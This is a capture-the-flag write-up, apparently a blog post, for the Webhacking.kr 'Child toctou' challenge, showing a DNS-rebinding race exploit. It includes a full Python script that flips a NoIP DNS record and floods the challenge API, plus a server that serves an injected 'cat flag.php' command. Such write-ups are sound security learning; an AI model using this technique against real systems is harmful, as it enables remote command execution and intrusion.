---
layout: post
title: "[Webhacking.kr] Child toctou 🚲 writeup (cont'd)"
categories: hacking writeup web
---

## Introduction
Link: [http://webhacking.kr:10020/](http://webhacking.kr:10020/)

In the last part, I have found the vulnerable code in `api.php`. The only thing that prevented me from solving that
was the dynamic DNS functionality. With the suggestion from a friend, I finally found a way to make my exploitation
idea work.

## The exploitation

### Dynamic DNS

NoIP's Dynamic DNS service is a free service that allows us to create a DNS record. Let's make use of that.

![change_dns](/assets/images/child-toctou/change_dns.png)

But I don't want to do it manually, so I inspect the API calls on the site, and convert to Python for automation. Fortunately, modern browsers (Tested on Firefox and Chrome) support copying a request as cURL, and there is an [online service](https://curlconverter.com/) that converts cURL commands to Python code.

![curl](/assets/images/child-toctou/inspector.png)

### DNS Resolver

Python can use OS's DNS resolver with `socket.gethostbyname` method, but it is slow and behind DNS caching mechanisms which can not be bypassed. So I used `dnspython` library.

One thing I noticed was when changing DNS record, DNS servers don't reflect the change immediately. There are some jumpings back and forth between the old and the new IPs. So my code didn't reliably work every time, but that is okay because I just need to see the flag once and I'm done.


### Exposing my server

Now how do I expose my server to carry the payload? I tried using ngrok, but ngrok free plan can not expose a specific port. So I decided to buy a cheap VPS from Vultr with an public IPv4 address.
One notice is Vultr blocks all incoming traffic except on port 22 (SSH) by default, so in order to expose port 10020, we need to unblock it first

```sh
sudo ufw allow from 202.182.106.159 proto tcp to any port 10020 
```

After creating the required folder structure, I ran the server

```sh
mkdir cmd
echo "cat flag.php" > cmd/ls.txt
python3 -m http.server 10020
```

## Exploitation code

__Warning: Sensitive information got stripped off the script, so it won't run.__
```python
import requests, threading, time
import dns.resolver as dns

g_done = False

def __noip_request(ip):
    cookies = {
        'REF_CODE': 'https%3A%2F%2Fwww.noip.com%2Fmembers%2Fdns%2F',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    }

    params = {
        'host_id': '******',
    }

    data = {
        'token': '******',
        'host[host]': 'l4rzy',
        'host[domain]': 'ddns.net',
        'host[ttl]': '60',
        'host[group_id]': '0',
        'host[type]': 'a',
        'host[ip]': ip,
        'nlocations': '0',
        'host[alias]': '',
        'host[ipv6]': '',
        'host[aname]': '',
        'host[port][ip]': '',
        'host[port][port]': '8080',
        'host[redirect][protocol]': 'https',
        'host[redirect][url]': '',
        'host[mask][title]': '',
        'host[mask][meta_keywords]': '',
        'host[mask][meta_desc]': '',
        'host[mx][0][mx]': '',
        'host[mx][0][priority]': '5',
        'do': 'update',
    }

    response = requests.post('https://www.noip.com/members/dns/host.php', params=params, cookies=cookies, headers=headers, data=data)


def change_dns(toMyServer = True):
    __noip_request('******' if toMyServer else '202.182.106.159')


def send(cmd):
    cookies = {
        'PHPSESSID': 'ofq76t3822i5ee1plskj2bafmt',
        'baby_toctou': 'abc91', # just a random string, anything will work
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        # 'Cookie': 'PHPSESSID=ofq76t3822i5ee1plskj2bafmt; baby_toctou=abc91',
        'DNT': '1',
        'Referer': 'http://webhacking.kr:10020/',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Host': 'l4rzy.ddns.net',
    }

    params = {
        'q': cmd,
    }

    response = requests.get('http://webhacking.kr:10020/api.php', params=params, cookies=cookies, headers=headers, verify=False)
    result = response.text
    if "flag{" in result:
        print(result)
        g_done = True

def check_ip(host, ip):
    result = dns.resolve(host, 'A')
    for i in result:
        resolved = i;
    print(resolved, flush=True)
    return resolved.to_text() == ip

def check_ip_times(host, ip, times):
    for i in range(times):
        if check_ip(host, ip) == False:
            return False
    return True

print('[info] changing the DNS A record to the designated IP ...')
ip_set = check_ip('l4rzy.ddns.net', '202.182.106.159')

if ip_set == False:
    change_dns(toMyServer = False)
    while ip_set ==  False:
        ip_set = check_ip_times('l4rzy.ddns.net', '202.182.106.159', 2)
        time.sleep(1)
        
print('done')
# ---------------------
print('[info] redirecting to our site ...', flush=True)
change_dns()
print(f'[info] getting in ...')

while not g_done:
    check_ip('l4rzy.ddns.net', '******')
    jobs = list()
    for i in range(10):
        jobs.append(threading.Thread(target=send, args=('ls',)))
        jobs[i].start()
        
    for i in range(10):
        jobs[i].join()
```

And when we see a bunch of requests like this on our server, the challenge got pwned.

![server_output](/assets/images/child-toctou/server_output.png)

## Conclusion
I was surprised that there were only 18 people have solved this challenge (I was the 19th). I believe many people have the idea to solve, but the process of solving it is a little bit cumbersome.

P.S. So just after solving the 2 toctou challenges, I just happened to know that TOCTOU was a class of software bugs. The idea behind this class of bugs is to exploit the time window between two calls to modify a state. Read more on wiki: [https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)